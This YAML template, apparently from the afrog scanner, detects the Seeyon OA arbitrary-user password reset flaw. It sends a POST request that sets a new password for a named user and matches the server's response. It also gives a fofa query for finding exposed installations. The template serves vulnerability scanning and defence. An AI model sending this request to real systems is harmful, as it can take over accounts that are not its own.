# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      {"loginName":"afrogtest","password":"admin@123456"}
    headers:
      Content-Type: application/json
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - '"code" : 500'
          - '"success" : false'
          - '"message" : null'
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/seeyon/rest/phoneLogin/phoneCode/resetPassword'
id: seeyon-resetpassword-anyuser
info:
  author: zan8in
  description: |-
    致远OA resetPassword任意用户密码修改漏洞,注意: 参数 loginName 需要真实存在的用户名
    fofa: app="致远互联-OA"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 致远OA resetPassword任意用户密码修改漏洞
  severity: high
  tags: seeyon,resetpassword,argus-import
